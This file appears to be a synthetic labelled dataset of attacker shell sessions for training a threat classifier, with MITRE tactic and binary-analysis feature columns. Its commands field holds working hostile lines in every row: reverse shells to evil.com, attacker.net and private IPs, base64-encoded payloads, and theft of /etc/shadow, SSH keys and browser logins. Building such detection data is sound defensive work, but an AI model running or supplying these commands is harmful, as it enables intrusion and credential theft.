session_id,src_ip,num_commands,duration_sec,commands,label_id,label_name,mitre_tactic_reconnaissance,mitre_tactic_resource_development,mitre_tactic_initial_access,mitre_tactic_execution,mitre_tactic_persistence,mitre_tactic_privilege_escalation,mitre_tactic_defense_evasion,mitre_tactic_credential_access,mitre_tactic_discovery,mitre_tactic_lateral_movement,mitre_tactic_collection,mitre_tactic_command_and_control,mitre_tactic_exfiltration,mitre_tactic_impact,mitre_severity_max,mitre_severity_mean,mitre_severity_weighted,mitre_kill_chain_score,mitre_unique_technique_count,mitre_total_commands,mitre_matched_commands,triage_file_size,triage_entropy,triage_priority,triage_is_go,triage_is_packed,triage_is_stripped,triage_is_dll,triage_is_static,triage_score_mining,triage_score_botnet,triage_score_recon,triage_score_destructive,ghidra_function_count,ghidra_total_instructions,ghidra_total_basic_blocks,ghidra_max_function_size,ghidra_avg_callers,ghidra_max_callers,ghidra_mining_pool_count,ghidra_crypto_wallet_count,ghidra_ip_count,ghidra_url_count,ghidra_shell_cmd_count,ghidra_file_path_count,ghidra_imports_file_io,ghidra_imports_process,ghidra_imports_network,ghidra_imports_crypto,ghidra_imports_evasion,ghidra_has_aes_sbox,ghidra_has_sha256_constants,ghidra_has_rc4_state,ghidra_has_xor_loop,ghidra_go_user_functions,ghidra_go_runtime_functions,angr_basic_blocks,angr_edges,angr_functions_recovered,angr_cyclomatic_complexity,angr_function_count,angr_user_functions_listed,angr_syscalls_network,angr_syscalls_file_io,angr_syscalls_process,angr_syscalls_memory,angr_ip_count,angr_url_count,angr_mining_indicator_count,angr_shell_cmd_count,angr_has_network,angr_has_file_manipulation,angr_has_process_control,angr_has_crypto,angr_has_mining,angr_has_persistence,angr_has_evasion,angr_has_shell_execution,angr_complexity_tier,angr_is_partial,angr_loaded_as_blob,script_line_count,script_url_count,script_download_count,script_arch_count,script_is_downloader,script_is_multi_arch,script_is_miner,script_has_persistence,script_has_anti_forensics,has_ghidra_results,has_angr_results,has_script_results,deep_func_ratio_angr_ghidra,deep_mining_signal_count,deep_total_network_indicators,deep_total_crypto_indicators,deep_max_complexity,deep_total_evasion_indicators,deep_is_go_consensus,num_downloads,download_shas
synth_exploit_669107,49.9.184.6,2,219.00812543014055,cat ~/.mozilla/firefox/*.default/logins.json ; cat ~/.ssh/authorized_keys,3,Exploit,0.2738943818263019,0.0,0.0504020014088129,2.9864433479345496,0.7736254713825335,2.9708654519756283,4.3577655859369795,6.17875087723154,2.1528496467586153,0.09289895894843236,2.0176152788057187,1.7562458372891596,1.9704018809110033,0.0,9.964891575287554,5.8337161250880945,7.430283636483402,6.063688516585447,10,8,6,1664193.7242102618,7.350004551044271,58.12524372943912,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_343239,60.224.216.111,6,298.9932654954072,"echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=' | base64 -d | bash; bash -i >& /dev/tcp/evil.com/443 0>&1; python -c 'import os;os.setuid(0);os.system(""/bin/bash"")'; python -c ""exec(__import__('base64').b64decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE='))""",3,Exploit,0.7519788152209896,0.0,0.8603637736463927,4.807245419699145,0.8312759163343622,2.9393995652760925,3.6638744549146534,6.616328238156906,2.116946562495129,0.29279089149738247,1.3954457530199063,2.7315766321452717,1.339407475903496,0.0,8.950146930593943,7.962678048170128,6.19554459234088,6.1773130169758,8,11,8,1246748.3440606159,7.503949741403517,79.43247118061907,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,20.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_865164,77.46.202.74,5,172.45823247284602,cat ~/.ssh/id_dsa; sudo su; cat ~/.psql_history; cat /etc/mysql/my.cnf | grep password; sudo su,3,Exploit,0.9085082600632244,0.0,0.44946856784806744,4.767637247677529,1.6398824109912107,4.008804837767135,3.542457598496904,3.7235921795178317,2.18829749033548,0.6502972010177583,2.040661529241572,3.5635768237296808,1.72086548581945,0.0,8.235305249207014,6.046853535746193,7.324809163555041,5.535255843771154,11,15,6,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_exploit_450917,206.134.92.8,3,872.474202238753,bash -i >& /dev/tcp/attacker.net/1234 0>&1 && cat /etc/shadow && cat /etc/master.passwd,3,Exploit,0.45835314794623727,0.0,0.3262085476514923,4.863992581270223,0.6900280727421209,3.035520484353521,4.041421185074765,6.66687485668109,2.708025221034559,1.8488418527597386,1.9792116017258263,1.2323795535433328,0.7371668791261727,0.0,8.934315624097586,5.659501959160341,7.268634751601807,7.492948994010485,7,7,9,524853.8013683222,6.596034885715975,72.73170773519632,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0,0.0,10.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_327343,172.22.227.112,9,834.8170873832644,"php -r '$sock=fsockopen(""192.168.1.100"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'; hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt; cat /etc/security/opasswd; cat /etc/shadow; gdb -p $(pgrep sshd) -ex 'dump memory /tmp/dump.bin 0x0 0xffffffff' -ex quit; gdb -p $(pgrep sshd) -ex 'dump memory /tmp/dump.bin 0x0 0xffffffff' -ex quit; cat ~/.python_history",3,Exploit,0.7803680283976322,0.0,0.2242505768130768,4.356907031242438,1.980967682497354,3.0289685201820644,4.193978503016111,6.661943674868651,2.554522036485306,1.5292923430847867,1.3754033048794818,2.100767153389559,1.985600237907805,0.0,8.766586745179556,5.635683881282995,7.837215600270225,4.350225588905871,8,8,4,1663593.9422517011,6.676573825724356,64.04362460314877,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0,0.0,6.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_811894,9.25.209.1,8,588.1419170298204,rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.100 9001 > /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 443 > /tmp/f; cat /etc/security/opasswd; cat ~/.ssh/authorized_keys,3,Exploit,0.7782815782932125,0.0,0.811618560728727,2.230973189098549,0.19658341421097147,2.9777864536817216,4.585666310412961,3.5511591006725673,1.3694790859720816,0.21375641689177027,2.931016898860496,3.3143281341867574,0.8471204294960097,0.0,8.55014478555277,7.521677007526222,7.681928651546665,4.653419344249757,5,10,8,1421403.2562861512,7.209054865344359,88.67215058497408,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_420866,19.211.206.182,10,117.90713566092606,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""evil.com"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])' ; sqlite3 ~/.config/google-chrome/Default/Login\ Data 'SELECT * FROM logins' ; sudo bash ; history",3,Exploit,0.2163888656287578,0.0,0.3131893504058222,4.942314029432515,1.3250464331412621,4.194169349874682,2.6672521581345356,3.881363481061257,1.655936112814578,0.00488537596090266,1.168585661418419,1.5614788943056634,1.2098430768751454,0.0,8.957708212064784,5.729865543749353,6.624533938040952,4.802291339571623,7,11,11,1544349.0374547846,6.860416675596579,58.249793752155654,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,18.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_943075,147.122.144.186,21,1024.6136170836403,"cat ~/.ssh/known_hosts; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""attacker.net"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""evil.com"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'; python -c ""exec(__import__('base64').b64decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE='))""; cat /etc/mysql/my.cnf | grep password; cat /etc/security/passwd; cat ~/.psql_history; find / -perm -4000 -type f 2>/dev/null -exec ls -la {} \;",3,Exploit,0.621594267640934,0.0,0.44937510874233944,4.854484743372959,0.7887173978010065,2.637056764246441,4.262493004537941,7.791411190521419,1.5246738394898616,1.2054191360594857,2.0033215984309147,1.2746751865232269,0.4237843350359738,0.0,7.050102204359724,5.328278721629832,7.988808841175757,5.476035933817589,11,7,12,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_exploit_536659,78.155.184.27,7,784.7647610548137,"cat /var/log/auth.log | grep -i pass; bash -i >& /dev/tcp/10.10.10.10/1234 0>&1; nc -e /bin/sh evil.com 4444; php -r '$sock=fsockopen(""attacker.net"",8080);exec(""/bin/sh -i <&3 >&3 2>&3"");'; base64 -d <<< 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=' | sh",3,Exploit,0.7871516741542581,0.0,0.35650013548835735,4.104278353004876,0.5747056283165457,2.1682417796834885,3.752798684670698,3.3165758722966494,1.4556353687858479,1.5867660047073249,2.0484722519345775,2.6435109463661695,1.4430546919620217,0.0,9.047262507539882,6.133552405157921,8.38966022382585,4.590616339630037,7,15,8,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_exploit_451427,62.11.80.129,8,474.2179850472704,"nc attacker.net 1234 -e /bin/bash; strings /dev/mem | grep -i password; cat ~/.config/google-chrome/Default/Login\ Data; ruby -rsocket -e'f=TCPSocket.open(""attacker.net"",4444).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'; cat ~/.ssh/id_ecdsa; cat ~/.python_history; cat ~/.zsh_history",3,Exploit,0.7848617217714731,0.0,0.8983648621711248,3.5416368885795078,0.9330185853243433,2.7924580056686144,4.693875382813314,4.074040018598655,1.5595313629423349,1.9594484382662134,2.062000204786014,2.668111967355143,0.7683844716454002,0.0,7.301146520562055,7.6903168024280415,7.279447385379602,5.168134266001944,10,10,10,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_exploit_272557,27.115.75.189,11,948.7382819236404,"grep -r 'DB_PASSWORD' /var/www 2>/dev/null; find / -perm -4000 -type f 2>/dev/null -exec ls -la {} \;; LD_PRELOAD=/tmp/.lib.so /bin/ls; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.168.1.100"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",3,Exploit,0.8080531259735425,0.0,0.7556047565758338,4.211814617079039,0.13090820433983064,2.2876115057271775,3.2765862173155087,5.355007808354959,1.87430965751888,1.5691299952154067,2.4317640541982746,2.2395791822158597,1.0973078000503236,0.0,9.35940887830412,6.891510551637882,8.458570152090974,6.8375945506912945,10,10,9,246239.96764516865,6.434623111935092,64.80888780720579,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,0.0,6.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_926728,100.146.2.19,8,1102.134560832411,"export LD_PRELOAD=/tmp/evil.so ; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.10.10.10"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",3,Exploit,0.31368965000146865,0.0,0.3668263947107897,2.6753674213275014,0.6247584498882919,4.371425524632442,2.1902485906534377,3.5893444683036115,1.9497469473100826,0.7534896603029013,1.2986320817764017,2.9731114421409246,1.0419998714693595,0.0,8.987543713864476,6.085515204403434,8.14519737470755,6.571459700615842,10,9,5,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_exploit_487376,39.43.214.177,3,347.8950654937403,sudo su; cat ~/.ssh/known_hosts; cat ~/.mozilla/firefox/*.default/logins.json,3,Exploit,0.8968603435040166,0.0,0.2374944624338069,2.1779651061753733,1.045232728667764,4.716552399721349,3.7766763064423974,5.839187446347907,1.8572868171040522,1.9975563919585417,1.853469096399173,1.7687462388341606,1.9290715751870353,0.0,9.60743130358335,5.9873382140631115,8.44536599860356,4.232985264437614,10,12,10,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_exploit_402707,87.138.196.18,2,803.0991583549375,history; export LD_PRELOAD=/tmp/evil.so,3,Exploit,0.09726894154416676,0.0,0.067245958562543,3.3387976879860553,1.2882270478867448,4.231120899418993,4.817796046851044,3.0168592492512163,2.3618630074870204,0.7546957480022995,2.4501028486051384,1.3790863359638266,0.1400961396906466,0.0,7.156029926292513,7.57097743129507,6.084314120314847,7.556155694217578,11,7,12,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_exploit_252052,171.236.155.213,22,1039.1677753832512,"perl -e 'use Socket;$i=""192.168.1.100"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"")' ; cat ~/.bash_history ; LD_PRELOAD=/tmp/.lib.so /bin/ls ; cat ~/.ssh/id_rsa ; perl -e 'use Socket;$i=""attacker.net"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"")' ; sudo -l",3,Exploit,0.0044772289318832925,0.0,0.8132563855000525,3.9254876546953557,1.3907928995447199,4.560158057240876,2.3506722938839744,4.176968791712695,2.9274157815771615,0.0468992182642749,2.752289834364098,3.2055071697399504,0.3215873582803894,0.0,7.2440184617137895,6.025694936935591,6.049052966086956,5.233248805493462,12,10,6,358796.5334978954,6.984526690812843,62.66628309029866,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0,0.0,10.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_575456,52.200.228.91,14,14.400831406481979,"export LD_PRELOAD=/tmp/evil.so; python -c ""exec(__import__('base64').b64decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE='))""; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""attacker.net"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.net 443 > /tmp/f; bash -c 'bash -i >& /dev/tcp/192.168.1.100/80 0>&1'; sudo -l",3,Exploit,0.27429722241996746,0.0,0.6981180589999109,3.4891741517185397,1.8023335534671023,3.1511299212083976,2.556732717794098,6.908163530959202,1.9092010732945262,0.040357965359578474,1.1359453173565137,2.6152316244606912,0.035407305702913616,0.0,8.439300963866437,7.218467859399193,6.489651009198047,4.081015229834191,6,12,10,466941.7330545657,7.084262296926797,58.70853826929455,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,0.0,8.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_145043,63.74.74.178,2,489.55639869374977,sqlite3 ~/.config/google-chrome/Default/Login\ Data 'SELECT * FROM logins'; grep -r 'DB_PASSWORD' /var/www 2>/dev/null,3,Exploit,0.038935672512268815,0.0,0.5441808505499812,2.018078121889924,0.1613604496267993,4.79526686001727,4.1227740887633795,5.557781472865981,2.677603831007697,0.5627924758990857,2.296795056173199,1.6563661945426764,1.1549785936983255,0.0,7.152408852675631,5.9715341519024445,7.889754976662415,5.241954163996989,12,11,10,1612943.2423840892,6.816687479714725,67.27732072118505,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,0.0,8.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_892780,138.247.247.246,22,765.2926734635796,"find / -perm -4000 -type f 2>/dev/null -exec ls -la {} \; && cat /var/www/html/config.php && base64 -d <<< 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=' | sh && nc 192.168.1.100 4444 -e /bin/bash && python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.168.1.100"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])' && bash -i >& /dev/tcp/192.168.1.100/1234 0>&1 && cat /etc/passwd && cat /etc/shadow && python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.10.10.10"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",3,Exploit,0.14524565147626,0.0,0.26550590676946306,3.8525333517222164,0.9668267296511743,4.402011972192595,3.676573748046831,5.802019596647407,2.8659993461179134,1.618282959194746,1.8713932343134025,1.9412619282925963,1.6283796008752938,0.0,7.031383837521083,5.907318063510095,8.010137295868436,7.995715372336832,6,13,8,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
